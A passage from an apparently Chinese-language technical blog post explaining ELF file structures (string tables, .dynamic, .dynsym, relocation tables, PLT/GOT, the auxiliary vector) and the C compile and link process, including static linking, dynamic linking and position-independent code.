<h3 id="字符串表（-strtab）"><a href="#字符串表（-strtab）" class="headerlink" title="字符串表（.strtab）"></a>字符串表（.strtab）</h3><p>ELF 文件中用到了很多字符串，比如段名、变量名等。因为字符串的长度往往是不定的，所以用固定的结构来表示它比较困难。一种很常见的做法是把字符串集中起来存放到一个表，然后使用字符串在表中的偏移来引用字符串。</p>
<p>通过这种方法，在ELF文件中引用字符串只须给出一个数字下标即可，不用考虑字符串长度的问题。一般字符串表在ELF文件中也以段的形式保存，常见的段名为“<code>.strtab</code>”或“<code>.shstrtab</code>”。这两个字符串表分别为字符串表（String Table）和段表字符串表（Section Header String Table）。顾名思义，字符串表用来保存普通的字符串，比如符号的名字；段表字符串表用来保存段表中用到的字符串，最常见的就是段名（<code>sh_name</code> ）。</p>
<p>注意，在字符串表中的每个字符串的<strong>开头</strong>和<strong>结尾</strong>都有一个 <code>\x00</code> 填充。</p>
<h2 id="动态链接相关"><a href="#动态链接相关" class="headerlink" title="动态链接相关"></a>动态链接相关</h2><h3 id="interp-段"><a href="#interp-段" class="headerlink" title=".interp 段"></a>.interp 段</h3><p>在动态链接的 ELF 可执行文件中，有一个专门的段叫做 <code>.interp</code> 段（“interp”是“interpreter”（解释器）的缩写）。</p>
<p><code>.interp</code> 的内容很简单，里面保存的就是一个字符串 <code>/lib64/ld-linux-x86-64.so.2</code> ，这个字符串就是可执行文件所需要的动态链接器的路径。</p>
<p>通常系统通过判断一个 ELF 程序是否有 <code>.interp</code> 来判断该 ELF 文件是否为动态链接程序。</p>
<h3 id="dynamic-段"><a href="#dynamic-段" class="headerlink" title=".dynamic 段"></a>.dynamic 段</h3><p>动态链接 ELF 中最重要的结构是 <code>.dynamic</code> 段，这个段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<code>.dynamic</code> 段是由<code>Elf*_Dyn</code> 构成的结构体数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure></div>
<p><code>Elf32_Dyn</code> 结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。我们这里列举几个比较常见的类型值（这些值都是定义在 <code>elf.h</code> 里面的宏），</p>
<ul>
<li><code>DT_SYMTAB</code>：指定了符号表的地址，<code>d_ptr</code> 表示 <code>.dynsym</code> 的地址。</li>
<li><code>DT_STRTAB</code>：指定了字符串表的地址，<code>d_ptr</code> 表示 <code>.synstr</code> 的地址。</li>
<li><code>DT_STRSZ</code>：指定了字符串表的大小，<code>d_val</code> 表示大小。</li>
<li><code>DT_HASH</code>：指定了符号哈希表的地址，用于加快符号查找的速度，<code>d_ptr</code> 表示 <code>.hash</code> 的地址。</li>
<li><code>DT_SONAME</code>：指定了共享库的名称。</li>
<li><code>DT_RPATH</code>：指定了库搜索路径（已废弃，不推荐使用）。</li>
<li><code>DT_INIT</code>：指定了初始化函数的地址，动态链接器在加载可执行文件或共享库时会调用该函数。</li>
<li><code>DT_FINI</code>：指定了终止函数的地址，动态链接器在程序结束时会调用该函数。</li>
<li><code>DT_NEEDED</code>：指定了需要的共享库的名称。</li>
<li><code>DT_REL/DT_RELA</code>：指定了重定位表的地址。</li>
</ul>
<h3 id="动态符号表（-dynsym）"><a href="#动态符号表（-dynsym）" class="headerlink" title="动态符号表（.dynsym）"></a>动态符号表（.dynsym）</h3><p>为了完成动态链接，最关键的还是所依赖的符号和相关文件的信息。我们知道在静态链接中，有一个专门的段叫做符号表 <code>.symtab</code>（Symbol Table），里面保存了所有关于该目标文件的符号的定义和引用。为了表示动态链接这些模块之间的符号导入导出关系，ELF 专门有一个叫做动态符号表（Dynamic Symbol Table）的段用来保存这些信息，这个段的段名通常叫做 <code>.dynsym</code>（Dynamic Symbol），同样也是由 <code>Elf*_Sym</code> 构成的结构体数组。</p>
<p>与 <code>.symtab</code> 不同的是，<code>.dynsym</code> 只保存了与动态链接相关的符号，对于那些模块内部的符号，比如模块私有变量则不保存。很多时候动态链接的模块同时拥有 <code>.dynsym</code> 和 <code>.symtab</code> 两个表，<code>.symtab</code> 中往往保存了所有符号，包括 <code>.dynsym</code> 中的符号。</p>
<p>与 <code>.symtab</code> 类似，动态符号表也需要一些辅助的表，比如用于保存符号名的字符串表。静态链接时叫做符号字符串表 <code>.strtab</code>（String Table），在这里就是动态符号字符串表 <code>.dynstr</code>（Dynamic String Table）；由于动态链接下，我们需要在程序运行时查找符号，为了加快符号的查找过程，往往还有辅助的符号哈希表（<code>.hash</code>）。</p>
<h3 id="动态链接重定位表（-rel-dyn-rel-data）"><a href="#动态链接重定位表（-rel-dyn-rel-data）" class="headerlink" title="动态链接重定位表（.rel.dyn&#x2F;.rel.data）"></a>动态链接重定位表（.rel.dyn&#x2F;.rel.data）</h3><p>共享对象需要重定位的主要原因是导入符号的存在。动态链接下，无论是可执行文件或共享对象，一旦它依赖于其他共享对象，也就是说有导入的符号时，那么它的代码或数据中就会有对于导入符号的引用。在编译时这些导入符号的地址未知，在静态链接中，这些未知的地址引用在最终链接时被修正。但是在动态链接中，导入符号的地址在运行时才确定，所以需要在运行时将这些导入符号的引用修正，即需要重定位。</p>
<p>共享对象的重定位与我们在前面“静态链接”中分析过的目标文件的重定位十分类似，唯一有区别的是目标文件的重定位是在静态链接时完成的，而共享对象的重定位是在装载时完成的。在静态链接中，目标文件里面包含有专门用于表示重定位信息的重定位表，比如 <code>.rel.text</code> 表示是代码段的重定位表，<code>.rel.data</code> 是数据段的重定位表。</p>
<p>动态链接的文件中，也有类似的重定位表分别叫做 <code>.rel.dyn</code> 和 <code>.rel.plt</code> ，它们分别相当于 <code>.rel.data</code> 和 <code>.rel.text</code> 。<code>.rel.dyn</code> 实际上是对数据引用的修正，它所修正的位置位于 <code>.got</code> 以及数据段；而 <code>.rel.plt</code> 是对函数引用的修正，它所修正的位置位于 <code>.got.plt</code> 。</p>
<h3 id="PLT-表（-plt）"><a href="#PLT-表（-plt）" class="headerlink" title="PLT 表（.plt）"></a>PLT 表（.plt）</h3><p>在未开启 FULL RELRO 的情况下 PLT 表的结构如下图所示， PLT 表在 <code>.plt</code>（有的还包括 <code>.plt.got</code>） 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108002353202.png"
                      alt="image-20241108002353202"
                ><br>PLT 表的形式如下所示：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>PLT0:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push *(GOT+8)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(GOT+16)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>bar@PLT:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(bar@GOT)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push n</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp PLT0</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp;  \text{PLT0:} \\
&amp;  \qquad  \text{push *(GOT+8)} \\
&amp;  \qquad \text{jmp *(GOT+16)} \\
&amp; \qquad  \vdots \\
&amp; \text{bar@PLT:} \\
&amp;  \qquad \text{jmp *(bar@GOT)} \\
&amp; \qquad \text{push n} \\
&amp; \qquad \text{jmp PLT0} \\
\end{align*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:12.66em;vertical-align:-6.08em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.74em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-6.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-4.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-2.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.42em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:1.92em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">PLT0:</span></span></span></span><span style="top:-7.9275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push *(GOT+8)</span></span></span></span><span style="top:-6.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(GOT+16)</span></span></span></span><span style="top:-4.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">bar@PLT:</span></span></span></span><span style="top:-1.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(bar@GOT)</span></span></span></span><span style="top:0.2325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push n</span></span></span></span><span style="top:1.7325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp PLT0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span></span></span></span></span></span></span>
<p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为函数 <code>bar</code> 在 GOT 表中的值的索引，<code>bar@GOT</code> 中初始值为 <code>jmp *(bar@GOT)</code> 指令的下一条指令，也就是说第一次调用 <code>bar</code> 函数的时候会继续执行跳转至 <code>PLT0</code> 进行 <code>bar@GOT</code> 的重定位并调用 <code>bar</code> 函数；第二次调用 <code>bar</code> 函数的时候由于 <code>bar@GOT</code> 已完成重定位因此会直接跳转至 <code>bar</code> 函数。</p>
<p>在开启 FULL RELRO 的情况下 PLT 表的结构如下图所示，此时的 PLT 表在 <code>.plt.sec</code> 而不是 <code>.plt</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108002437068.png"
                      alt="image-20241108002437068"
                ><br>由于 GOT 表在装载时已经完成重定位且不可写，因此不存在延迟绑定，PLT 直接根据 GOT 表存储的函数地址进行跳转。</p>
<h3 id="GOT-表（-got-got-plt）"><a href="#GOT-表（-got-got-plt）" class="headerlink" title="GOT 表（.got&#x2F;.got.plt）"></a>GOT 表（.got&#x2F;.got.plt）</h3><p>ELF 将 GOT 拆分成了两个表叫做 <code>.got</code> 和 <code>.got.plt</code> 。其中 <code>.got</code> 用来保存全局变量引用的地址，<code>.got.plt</code> 用来保存函数引用的地址，也就是说，所有对于外部函数的引用全部被分离出来放到了 <code>.got.plt</code> 中（当然有的 ELF 文件可能吧这两个表合并为一个 <code>.got</code> 表，结构等同于后面提到的 <code>.got.plt</code>）。另外 <code>.got.plt</code> 还有一个特殊的地方是它的前三项是有特殊意义的，分别含义如下：</p>
<ul>
<li>第一项保存的是 <code>.dynamic</code> 段的偏移（也有可能是 <code>.dynamic</code> 段的地址）。</li>
<li>第二项是一个 <code>link_map</code> 的结构体指针，里面保存着动态链接的一些相关信息，是重定位函数 <code>_dl_runtime_resolve</code> 的第一个参数。</li>
<li>第三项保存的是 <code>_dl_runtime_resolve</code> 的地址。</li>
</ul>
<p><code>.got.plt</code> 在内存中的状态如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108003009195.png"
                     
                ></p>

  <div class="note p-4 mb-4 rounded-small red info">
    <p>注意：静态链接程序也是有 plt 表和 got 表的，并且 plt 表也会被调用。</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108003049464.png"
                     
                ></p>
<h3 id="辅助信息数组"><a href="#辅助信息数组" class="headerlink" title="辅助信息数组"></a>辅助信息数组</h3><p><strong>无论静态还是动态链接程序都有辅助信息数组，只是动态链接程序是动态链接器使用辅助信息数组。</strong></p>
<p>站在动态链接器的角度看，当操作系统把控制权交给它的时候，它将开始做链接工作，那么至少它需要知道关于可执行文件和本进程的一些信息，比如可执行文件有几个段（“Segment”）、每个段的属性、程序的入口地址（因为动态链接器到时候需要把控制权交给可执行文件）等。</p>
<p>这些信息往往由操作系统传递给动态链接器，保存在进程的堆栈里面。我们在前面提到过，进程初始化的时候，事实上，堆栈里面还保存了动态链接器所需要的一些辅助信息数组（Auxiliary Vector）。辅助信息的格式也是一个结构数组，它的结构被定义在 <code>elf.h</code> ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> a_type;		<span class="comment">/* Entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> a_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that,</span></span><br><span class="line"><span class="comment">	 though, since it does not work when using 32-bit definitions</span></span><br><span class="line"><span class="comment">	 on 64-bit platforms and vice versa.  */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>a_type</code> 字段表示辅助信息数组的类型。下面是一些常见的 <code>a_type</code> 值及其对应的含义：<ul>
<li><code>AT_NULL (0)</code>：辅助向量列表的结束标志。在列表的最后一个条目中使用。</li>
<li><code>AT_IGNORE (1)</code>：忽略的辅助向量类型。在某些情况下，可以将该类型的辅助向量忽略。</li>
<li><code>AT_EXECFD (2)</code>：可执行文件的文件描述符。表示打开可执行文件的文件描述符。</li>
<li><code>AT_PHDR (3)</code>：程序头表的地址。指向程序头表在内存中的起始地址。</li>
<li><code>AT_PHENT (4)</code>：程序头表中每个条目的大小（字节）。指示每个程序头表条目的字节数。</li>
<li><code>AT_PHNUM (5)</code>：程序头表的条目数量。指示程序头表中的条目数量。</li>
<li><code>AT_PAGESZ (6)</code>：页面大小。表示操作系统使用的页面大小。</li>
<li><code>AT_BASE (7)</code>：共享对象的基地址。指向主共享对象的基地址。</li>
<li><code>AT_FLAGS (8)</code>：标志位。包含一些特定于操作系统的标志。</li>
<li><code>AT_ENTRY (9)</code>：程序入口点的地址。指向程序的入口点地址。</li>
<li><code>AT_NOTELF (10)</code>：不是ELF文件。指示加载程序的文件不是有效的ELF文件。</li>
</ul>
</li>
<li><code>a_un</code>：该成员是一个联合体（union），用于存储辅助向量条目的值。在这段代码中，由于指针类型的元素会在 32 位和 64 位平台上产生兼容性问题，所以注释中提到不再添加指针元素。<ul>
<li><code>a_val</code>：如果辅助向量条目的类型是一个整数值，那么该成员将存储该整数值。它也是一个 32 位的无符号整数。</li>
</ul>
</li>
</ul>
<h1 id="程序编译过程"><a href="#程序编译过程" class="headerlink" title="程序编译过程"></a>程序编译过程</h1><p>从源文件编译链接形成 ELF 文件的过程如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004250085.png"
                      alt="image-20241108004250085"
                ></p>
<h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>首先是源代码文件和相关的头文件，如 <code>stdio.h</code> 等被预编译器 cpp 预编译成一个 <code>.i</code> 文件。对于 C++ 程序来说，它的源代码文件的扩展名可能是 <code>.cpp</code> 或 <code>.cxx</code> ，头文件的扩展名可能是 <code>.hpp</code> ，而预编译后的文件扩展名是 <code>.ii</code> 。</p>
<p>第一步预编译的过程相当于如下命令（<code>-E</code> 表示只进行预编译）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure></div>
<p>或者：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cpp hello.c &gt; hello.i</span><br></pre></td></tr></table></figure></div>
<p>预编译过程主要处理那些源代码文件中的以 <code>#</code> 开始的预编译指令。比如 <code>#include</code> 、<code>#define</code> 等，主要处理规则如下：</p>
<ul>
<li>将所有的 <code>#define</code> 删除，并且展开所有的宏定义。</li>
<li>处理所有条件预编译指令，比如 <code>#if</code> 、<code>#ifdef</code> 、<code>#elif</code> 、<code>#else</code> 、<code>#endif</code> 。</li>
<li>处理 <code>#include</code> 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件。</li>
<li>删除所有的注释 <code>//</code> 和 <code>/* */</code> 。</li>
<li>添加行号和文件名标识，比如 <code>#2&quot;hello.c&quot;2</code> ，以便于编译时编译器产生调试用的行号信息及用于编译时产生编译错误或警告时能够显示行号。</li>
<li>保留所有的 <code>#pragma</code> 编译器指令，因为编译器须要使用它们。</li>
</ul>
<p>经过预编译后的 <code>.i</code> 文件不包含任何宏定义，因为所有的宏已经被展开，并且包含的文件也已经被插入到 <code>.i</code> 文件中。所以当我们无法判断宏定义是否正确或头文件包含是否正确时，可以查看预编译后的文件来确定问题。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生产相应的汇编代码文件，这个过程往往是我们所说的整个程序构建的核心部分，也是最复杂的部分之一。</p>
<p>上面的编译过程相当于如下命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –S hello.i –o hello.s</span><br></pre></td></tr></table></figure></div>
<h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编器是将汇编代码转变成机器可以执行的指令，每一个汇编语句几乎都对应一条机器指令。所以汇编器的汇编过程相对于编译器来讲比较简单，它没有复杂的语法，也没有语义，也不需要做指令优化，只是根据汇编指令和机器指令的对照表一一翻译就可以了，“汇编”这个名字也来源于此。</p>
<p>上面的汇编过程我们可以调用汇编器 as 来完成：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">as hello.s –o hello.o</span><br></pre></td></tr></table></figure></div>
<p>或者使用 gcc 命令从 C 源代码文件开始，经过预编译、编译和汇编直接输出目标文件（Object File）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –c hello.c –o hello.o</span><br></pre></td></tr></table></figure></div>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>静态链接是在编译过程的最后阶段将多个目标文件（如 <code>.o</code> 文件）以及所需的库文件合并在一起，生成最终的可执行文件或共享库的过程。</p>
<p>可以使用如下命令将 <code>a.o</code> 和 <code>b.o</code> 链接为目标文件 ab 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ld a.o b.o -o ab</span><br></pre></td></tr></table></figure></div>
<h3 id="合并代码和数据段（Code-and-Data-Segment-Merging）"><a href="#合并代码和数据段（Code-and-Data-Segment-Merging）" class="headerlink" title="合并代码和数据段（Code and Data Segment Merging）"></a>合并代码和数据段（Code and Data Segment Merging）</h3><p>链接器将多个目标文件中的代码段和数据段合并成一个更大的代码段和数据段。这样，所有的目标文件中的代码和数据都会被整合到最终的可执行文件或静态库中。</p>
<h3 id="符号解析（Symbol-Resolution）"><a href="#符号解析（Symbol-Resolution）" class="headerlink" title="符号解析（Symbol Resolution）"></a>符号解析（Symbol Resolution）</h3><p>链接器负通过<strong>重定位表</strong>解析目标文件中的符号引用。每个目标文件都包含对其他目标文件或库中定义的符号的引用，例如函数、变量等。链接器会检查这些引用并确定对应的定义位置。</p>
<p>对于可重定位的 ELF 文件来说，它必须包含有重定位表，用来描述如何修改相应的段里的内容。对于每个要被重定位的 ELF 段都有一个对应的重定位表，而一个重定位表往往就是 ELF 文件中的一个段，所以其实重定位表也可以叫重定位段。</p>
<p>比如代码段 <code>.text</code> 如有要被重定位的地方，那么会有一个相对应叫 <code>.rel.text</code> 的段保存了代码段的重定位表；如果代码段 <code>.data</code> 有要被重定位的地方，就会有一个相对应叫 <code>.rel.data</code> 的段保存了数据段的重定位表。</p>
<p>链接器通过 <code> Elf32_Rel</code> 的 <code> r_offset</code> 加上所在段的起始位置得到<strong>重定位入口的位置</strong>；通过 <code>r_info</code> 的低 8 为得知<strong>重定位类型</strong>；通过 <code>r_info</code> 的高 24 位得到重定位符号在符号表（<code>.symtab</code>）中的下标。</p>
<h3 id="符号重定位（Symbol-Relocation）"><a href="#符号重定位（Symbol-Relocation）" class="headerlink" title="符号重定位（Symbol Relocation）"></a>符号重定位（Symbol Relocation）</h3><p>链接器通过符号表对应的  <code> Elf32_Rel</code> 的 <code>st_value</code> 表示该符号在段中的<strong>偏移</strong>，进而可以根据<strong>重定位类型</strong>计算出重定位入口所要修正的值。最后将对应的重定位入口 patch 成正确的值。32 位静态链接常用到的重定位类型如下：</p>
<ul>
<li><code>R_386_32</code>：绝对地址。</li>
<li><code>R_386_PC32</code>：相对于当前指令地址的下一条指令相对地址。</li>
</ul>
<h3 id="解析库依赖关系（Library-Dependency-Resolution）"><a href="#解析库依赖关系（Library-Dependency-Resolution）" class="headerlink" title="解析库依赖关系（Library Dependency Resolution）"></a>解析库依赖关系（Library Dependency Resolution）</h3><p>如果目标文件依赖于外部库文件（如标准库或其他第三方库），链接器会解析这些库的依赖关系，并将所需的库文件链接到最终的可执行文件或静态库中。这样，在运行时，可执行文件或静态库就能够访问和使用这些库中提供的功能。</p>
<h3 id="生成重定位表（Relocation-Table）"><a href="#生成重定位表（Relocation-Table）" class="headerlink" title="生成重定位表（Relocation Table）"></a>生成重定位表（Relocation Table）</h3><p>链接器生成重定位表，记录了需要进行符号重定位的位置和相关信息。这些重定位表将在最终的可执行文件或静态库中被使用，以便在加载和执行时进行正确的符号重定位。</p>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>动态链接（Dynamic Linking）本质是指把链接这个过程推迟到了运行时再进行，准确的说这个过程应该放在装载部分。不过动态链接的出现很大一部分原因是为了解决内存浪费问题，因此直接照搬静态链接的方式不合理，需要做一些改变。</p>
<p>另外我们称一个程序为动态链接程序或静态链接程序指的是该程序是否有动态链接过程。</p>
<p><strong>注意动态链接不包括合并代码和数据段的过程，各个模块在内存中独立存在。</strong></p>
<h3 id="装载时重定位"><a href="#装载时重定位" class="headerlink" title="装载时重定位"></a>装载时重定位</h3><p>由于需要将多个模块装载到内存中，因此动态链接难免会有地址冲突问题，这就需要我们在加载的时候将模块中的相关地址修改为正确的值，这就是装载时重定位。</p>
<p>Linux和GCC支持这种装载时重定位的方法，在产生共享对象时，使用了两个GCC参数 <code>-shared</code> 和 <code>-fPIC</code> ，如果只使用 <code>-shared</code> ，那么输出的共享对象就是使用装载时重定位的方法。</p>
<h3 id="地址无关代码"><a href="#地址无关代码" class="headerlink" title="地址无关代码"></a>地址无关代码</h3><p>如果采用装载时重定位的方法虽然能够做到任意地址装载，但存在弊端。比如模块装载到不同位置会导致模块的代码段内容发生改变，无法实现共享库的复用，造成内存浪费；每次装载重定位会影响性能等。</p>
<p>地址无关代码的出现很好的解决了装载时重定位的缺点。地址无关代码的基本想法就是把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。这种方案就是目前被称为地址无关代码（PIC,Position-independent Code）的技术。这也就是 GCC 的 <code>-fPIC</code> 编译参数。</p>
<p>模块中各种类型的地址引用方式有以下 4 种：</p>
<ul>
<li>模块内部的函数调用、跳转等。</li>
<li>模块内部的数据访问，比如模块中定义的全局变量、静态变量。</li>
<li>模块外部的函数调用、跳转等。</li>
<li>模块外部的数据访问，比如其他模块中定义的全局变量。</li>
</ul>
<p>对于前两种引用方式由于是在模块内部，相对地址偏移固定，因此可以通过 <code>[rip + xxx]</code> （注意这里的 rip 是当前指令的<strong>下一条指令</strong>的地址，下一条指令指的是<strong>地址相邻</strong>的下一条指令）的方式进行引用，从而做到地址无关。因此关键在于后两种怎么解决。</p>
<p>模块间的访问比模块内部稍微麻烦一点，因为模块间的数据访问目标地址要等到装载时才决定，我们前面提到要使得代码地址无关，基本的思想就是把跟地址相关的部分放到数据段里面，很明显，这些其他模块的全局变量的地址是跟模块装载地址有关的。ELF 的做法是在数据段里面建立一个指向这些变量的指针数组，也被称为全局偏移表（Global Offset Table，GOT），当代码需要引用该全局变量时，可以通过 GOT 中相对应的项间接引用。</p>
<p>前面模块内部的解决方法实际上并不严谨，比如一些全局变量以及函数声明没有初始化会被认为是若弱符号，这些弱符号编译器并不知道是否只在本模块定义，因此不能仅使用 <code>[rip + xxx]</code> 的方式访问。</p>
<p>针对这种情况的解决办法是所有的使用这个变量的指令都指向位于可执行文件中的那个副本。ELF 共享库在编译时，默认都把定义在模块内部的全局变量当作定义在其他模块的全局变量，也就是说当作前面的类型四，通过 GOT 来实现变量的访问。当共享模块被装载时，如果某个全局变量在可执行文件中拥有副本，那么动态链接器就会把 GOT 中的相应地址指向该副本，这样该变量在运行时实际上最终就只有一个实例。如果变量在共享模块中被初始化，那么动态链接器还需要将该初始化值复制到程序主模块中的变量副本；如果该全局变量在程序主模块中没有副本，那么 GOT 中的相应地址就指向共享模块内部的该变量副本。<strong>这就是为什么 libc 的 GOT 表中会有自身函数。</strong></p>
